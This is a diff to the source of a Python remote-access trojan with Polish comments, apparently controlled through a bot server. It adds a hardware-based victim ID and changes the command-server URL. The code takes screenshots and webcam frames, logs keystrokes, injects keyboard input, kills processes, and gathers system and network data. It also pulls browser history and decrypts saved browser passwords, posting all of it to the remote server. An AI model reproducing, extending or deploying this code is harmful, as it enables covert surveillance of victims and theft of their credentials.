@@ -22,10 +22,17 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import base64
 from pynput.keyboard import Controller
+import hashlib
 
 # 🎯 KONFIGURACJA
-API_URL = "https://money-cat-bot.onrender.com"  # Zmienna do wskazania lokalizacji serwera Express
+API_URL = "http://localhost:3000"  # Zmienna do wskazania lokalizacji serwera Express
 COMPUTER_NAME = socket.gethostname()
+
+def get_id():
+    d = lambda c: subprocess.getoutput(c).split("\n")[1].strip()
+    return hashlib.sha256(f"{d('wmic csproduct get UUID')}{d('wmic cpu get ProcessorId')}".encode()).hexdigest()[:15]
+
+COMPUTER_ID = get_id()
 
 CAMERA_INDEX = 0  # Jeśli masz kilka kamerek, możesz zmienić
 DELAY = 60  # Czas między wysyłaniem
@@ -48,43 +55,43 @@ def watch_changes():
     print("😎 Started watching for changes!")
     for change in change_stream:
         data = change.get("fullDocument", {})
-        name = data.get("COMPUTER_NAME")
+        name = data.get("COMPUTER_ID")
         type = data.get("type")
 
-        if name == COMPUTER_NAME.upper():
+        if name == COMPUTER_ID:
             print("Received request type:", type)
             match type and type.strip().lower():
                 case "ss":
-                    send_to_express("`✅` Successfully received `ss` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `ss` request!", COMPUTER_ID)
                     send_screenshot_now()
                 
                 case "camera":
-                    send_to_express("`✅` Successfully received `camera` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `camera` request!", COMPUTER_ID)
                     send_camera_frame_now()
 
                 case "info":
-                    send_to_express("`✅` Successfully received `info` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `info` request!", COMPUTER_ID)
                     send_info_now()
 
                 case "utils":
-                    send_to_express("`✅` Successfully received `utils` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `utils` request!", COMPUTER_ID)
                     send_utils_now()
 
                 case "network_info":
-                    send_to_express("`✅` Successfully received `network_info` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `network_info` request!", COMPUTER_ID)
                     send_network_info_now()
 
                 case "processes":
-                    send_to_express("`✅` Successfully received `processes` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `processes` request!", COMPUTER_ID)
                     send_processes_now()
             
                 case "process":
-                    send_to_express("`✅` Successfully received `process` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `process` request!", COMPUTER_ID)
                     args = data.get("args", {})
                     pid = args.get("id")
                     activity = args.get("activity")
                     if pid is None:
-                        send_to_express("`⚠️` No PID provided!", COMPUTER_NAME)
+                        send_to_express("`⚠️` No PID provided!", COMPUTER_ID)
                     if isinstance(pid, str) and pid.isdigit():
                         pid = int(pid)
                     if activity == "kill":
@@ -94,53 +101,53 @@ def watch_changes():
                                     os.system(f"taskkill /PID {pid} /F")
                                 else:
                                     os.kill(pid, signal.SIGTERM)
-                                send_to_express(f"`💀` Successfully killed process `{pid}`!", COMPUTER_NAME)
+                                send_to_express(f"`💀` Successfully killed process `{pid}`!", COMPUTER_ID)
                             else:
-                                send_to_express(f"`❌` Process `{pid}` not found!", COMPUTER_NAME)
+                                send_to_express(f"`❌` Process `{pid}` not found!", COMPUTER_ID)
                         except ValueError:
-                            send_to_express(f"`⚠️` Invalid PID `{pid}`!", COMPUTER_NAME)
+                            send_to_express(f"`⚠️` Invalid PID `{pid}`!", COMPUTER_ID)
                         except PermissionError:
-                            send_to_express(f"`⛔` No permission to kill process `{pid}`!", COMPUTER_NAME)
+                            send_to_express(f"`⛔` No permission to kill process `{pid}`!", COMPUTER_ID)
                         except Exception as e:
-                            send_to_express(f"`⚠️` Error killing process `{pid}`: {e}", COMPUTER_NAME)
+                            send_to_express(f"`⚠️` Error killing process `{pid}`: {e}", COMPUTER_ID)
                             print(e)
 
                 case "applications":
-                    send_to_express("`✅` Successfully received `applications` request!", COMPUTER_NAME)
-                    send_to_express(list_open_apps(), COMPUTER_NAME, code_block=True, isEmbed=True, Title="Currently Open Applications", Color=True)
+                    send_to_express("`✅` Successfully received `applications` request!", COMPUTER_ID)
+                    send_to_express(list_open_apps(), COMPUTER_ID, code_block=True, isEmbed=True, Title="Currently Open Applications", Color=True)
 
                 case "app":
-                    send_to_express("`✅` Successfully received `app` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `app` request!", COMPUTER_ID)
                     args = data.get("args", {})
                     activity = args.get("activity")
                     name = args.get("name")
                     if activity == "close":
                         close_app_by_name(name)
-                        send_to_express(f"`💣` Closed `{get_full_app_name(name)}` application!", COMPUTER_NAME)
+                        send_to_express(f"`💣` Closed `{get_full_app_name(name)}` application!", COMPUTER_ID)
                 
                 case "history":
-                    send_to_express("`✅` Successfully received `history` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `history` request!", COMPUTER_ID)
                     args = data.get("args", {})
                     name = args.get("name")
                     id = args.get("id")
                     history_array = get_browser_history(browser=name, limit=id)
                     try:
-                        requests.post(f"{API_URL}/history", json={"COMPUTER_NAME": COMPUTER_NAME, "history": history_array, "browser": name})
+                        requests.post(f"{API_URL}/history", json={"COMPUTER_ID": COMPUTER_ID, "history": history_array, "browser": name})
                     except requests.exceptions.RequestException as e:
                         print(e)
                 
                 case "passwords":
-                    send_to_express("`✅` Successfully received `passwords` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `passwords` request!", COMPUTER_ID)
                     args = data.get("args", {})
                     name = args.get("name")
                     passwords_array = get_browser_passwords(browser=name)
                     try:
-                        requests.post(f"{API_URL}/passwords", json={"COMPUTER_NAME": COMPUTER_NAME, "passwords": passwords_array, "browser": name})
+                        requests.post(f"{API_URL}/passwords", json={"COMPUTER_ID": COMPUTER_ID, "passwords": passwords_array, "browser": name})
                     except requests.exceptions.RequestException as e:
                         print(e)
                 
                 case "keyboard":
-                    send_to_express("`✅` Successfully received `keyboard` request!", COMPUTER_NAME)
+                    send_to_express("`✅` Successfully received `keyboard` request!", COMPUTER_ID)
                     keyboard = Controller()
                     args = data.get("args", {})
                     activity = args.get("activity")
@@ -148,28 +155,28 @@ def watch_changes():
                     if activity == "write":
                         try:
                             keyboard.type(content)
-                            send_to_express(f"`💻` Successfully sent `{content}` to keyboard!", COMPUTER_NAME)
+                            send_to_express(f"`💻` Successfully sent `{content}` to keyboard!", COMPUTER_ID)
                         except Exception as e:
-                            send_to_express(f"`⚠️` Error typing `{content}`: {e}", COMPUTER_NAME)
+                            send_to_express(f"`⚠️` Error typing `{content}`: {e}", COMPUTER_ID)
                             print(e)
                     elif activity == "key":
                         try:
                             if content in pyautogui.KEYBOARD_KEYS:
                                 pyautogui.press(content)
-                                send_to_express(f"`💻` Successfully sent `[{content.upper()}]` to keyboard!", COMPUTER_NAME)
+                                send_to_express(f"`💻` Successfully sent `[{content.upper()}]` to keyboard!", COMPUTER_ID)
                             else:
-                                send_to_express(f"`❌` Key `[{content.upper()}]` not found!", COMPUTER_NAME)
+                                send_to_express(f"`❌` Key `[{content.upper()}]` not found!", COMPUTER_ID)
                         except Exception as e:
-                            send_to_express(f"`⚠️` Error pressing key `[{content.upper()}]`: {e}", COMPUTER_NAME)
+                            send_to_express(f"`⚠️` Error pressing key `[{content.upper()}]`: {e}", COMPUTER_ID)
                             print(e)
                     elif activity == "list":
                         try:
                             excluded_keys = set("!\"#$%&'()*+,-./0123456789:;<=>?@[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
                             filtered_keys = [key.strip() for key in pyautogui.KEYBOARD_KEYS if key.strip() and key not in excluded_keys]
                             keys_list = "\n".join(filtered_keys)
-                            send_to_express(keys_list, computer_name=COMPUTER_NAME, code_block=True, isEmbed=True, Title="Keyboard Available Keys List", Color=True)
+                            send_to_express(keys_list, computer_id=COMPUTER_ID, code_block=True, isEmbed=True, Title="Keyboard Available Keys List", Color=True)
                         except Exception as e:
-                            send_to_express(f"`⚠️` Error listing keys: {e}", COMPUTER_NAME)
+                            send_to_express(f"`⚠️` Error listing keys: {e}", COMPUTER_ID)
                             print(e)
 
             document_id = data.get("_id")
@@ -182,17 +189,10 @@ def run_watch():
     thread.daemon = True
     thread.start()
 
-def open_app():
-    try:
-        subprocess.Popen([r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"])  # Używamy Popen, aby nie blokować głównego wątku
-        print("✅ Browser started!")
-    except Exception as e:
-        print(e)
-
-def send_to_express(message, computer_name=None, code_block=False, isEmbed=False, Title=None, Color=False):
+def send_to_express(message, computer_id=None, code_block=False, isEmbed=False, Title=None, Color=False):
     payload = {
         "message": message,
-        "COMPUTER_NAME": computer_name,
+        "COMPUTER_ID": computer_id,
         "isEmbed": isEmbed,
         "Title": Title,
         "Color": Color,
@@ -230,7 +230,7 @@ async def send_screenshot():
         with open(screenshot_path, 'rb') as f:
             files = {'screenshot': f}
             try:
-                requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
+                requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_ID": COMPUTER_ID})
             except requests.exceptions.RequestException as e:
                 print(e)
         
@@ -249,7 +249,7 @@ def send_screenshot_now():
         files = {'screenshot': f}
         data = {
             "message": f"**{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}**",
-            "COMPUTER_NAME": COMPUTER_NAME
+            "COMPUTER_ID": COMPUTER_ID
         }
         
         try:
@@ -266,7 +266,7 @@ def send_info_now():
     cwd = os.getcwd() # Ścieżka do katalogu roboczego
 
     data = {
-        "COMPUTER_NAME": COMPUTER_NAME,
+        "COMPUTER_ID": COMPUTER_ID,
         "external_ip": external_ip,
         "private_ip": private_ip,
         "user_info": user_info,
@@ -304,7 +304,7 @@ def send_utils_now():
         net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]
 
     data = {
-        "COMPUTER_NAME": COMPUTER_NAME,
+        "COMPUTER_ID": COMPUTER_ID,
         "cpu_percent": f"{cpu_percent}%",
         "memory": memory_dict,
         "disk_usage": disk_usage_dict,
@@ -324,7 +324,7 @@ def send_network_info_now():
         net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]
 
     try:
-        requests.post(f"{API_URL}/network_info", json={ "COMPUTER_NAME": COMPUTER_NAME, "net_if_addrs": net_if_addrs_dict })
+        requests.post(f"{API_URL}/network_info", json={ "COMPUTER_ID": COMPUTER_ID, "net_if_addrs": net_if_addrs_dict })
     except requests.exceptions.RequestException as e:
         print(e)
 
@@ -342,7 +342,7 @@ def send_processes_now():
             continue
 
     try:
-        requests.post(f"{API_URL}/processes", json={ "COMPUTER_NAME": COMPUTER_NAME, "processes": processes_list })
+        requests.post(f"{API_URL}/processes", json={ "COMPUTER_ID": COMPUTER_ID, "processes": processes_list })
     except requests.exceptions.RequestException as e:
         print(e)
 
@@ -352,19 +352,19 @@ async def send_keys():
 
         async with lock:
             if keys_pressed:
-                send_to_express(''.join(keys_pressed), COMPUTER_NAME, code_block=True, isEmbed=True, Title="Key Logger")
+                send_to_express(''.join(keys_pressed), COMPUTER_ID, code_block=True, isEmbed=True, Title="Key Logger")
                 keys_pressed.clear()
 
-def start_bot(external_ip, private_ip):
+def start_bot(external_ip, private_ip, id):
     try:
-        requests.post(f"{API_URL}/start", json={"COMPUTER_NAME": COMPUTER_NAME, "external_ip": external_ip, "private_ip": private_ip})
+        requests.post(f"{API_URL}/start", json={"COMPUTER_ID": COMPUTER_ID, "COMPUTER_NAME": COMPUTER_NAME, "external_ip": external_ip, "private_ip": private_ip, "id": id})
     except requests.exceptions.RequestException as e:
         print(e)
         
 async def send_camera_frame():
     if not cap.isOpened():
         print("❌ Can not get image from camera!")
-        send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
+        send_to_express("`❌` Can not get image from camera!", COMPUTER_ID)
         return
     
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
@@ -378,7 +378,7 @@ async def send_camera_frame():
         ret, frame = cap.read()
         if not ret:
             print("❌ Error connecting to camera frame!")
-            send_to_express("`❌` Error connecting to camera frame!", computer_name=COMPUTER_NAME)
+            send_to_express("`❌` Error connecting to camera frame!", COMPUTER_ID)
             break
 
         frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
@@ -387,7 +387,7 @@ async def send_camera_frame():
         with open(frame_path, 'rb') as f:
             files = {'frame': f}
             try:
-                response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
+                response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_ID": COMPUTER_ID})
                 if response.status_code == 200:
                     print(f"✔️ Frame uploaded successfully: {frame_path}")
                 else:
@@ -402,7 +402,7 @@ def send_camera_frame_now():
 
     if not cap.isOpened():
         print("❌ Can not get image from camera!")
-        send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
+        send_to_express("`❌` Can not get image from camera!", COMPUTER_ID)
         return
     
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
@@ -413,7 +413,7 @@ def send_camera_frame_now():
     ret, frame = cap.read()
     if not ret:
         print("❌ Error connecting to camera frame!")
-        send_to_express("`❌` Error connecting to camera frame!", computer_name=COMPUTER_NAME)
+        send_to_express("`❌` Error connecting to camera frame!", COMPUTER_ID)
         return
 
     frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
@@ -422,7 +422,7 @@ def send_camera_frame_now():
     with open(frame_path, 'rb') as f:
         files = {'frame': f}
         try:
-            response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_NAME": COMPUTER_NAME})
+            response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_ID": COMPUTER_ID})
             if response.status_code == 200:
                 print(f"✔️ Frame uploaded successfully: {frame_path}")
             else:
@@ -433,16 +433,15 @@ def send_camera_frame_now():
     cap.release()
 
 async def start():
-    print("Starting the application...")
-
-    open_app()
-    run_watch()
+    print("🎓 Starting the application...")
 
     external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
     private_ip = socket.gethostbyname(socket.gethostname())
 
-    start_bot(external_ip, private_ip)
+    start_bot(external_ip, private_ip, id=COMPUTER_ID)
     print('✅ Application started!')
+    
+    run_watch()
 
     await asyncio.gather(
         send_screenshot(),
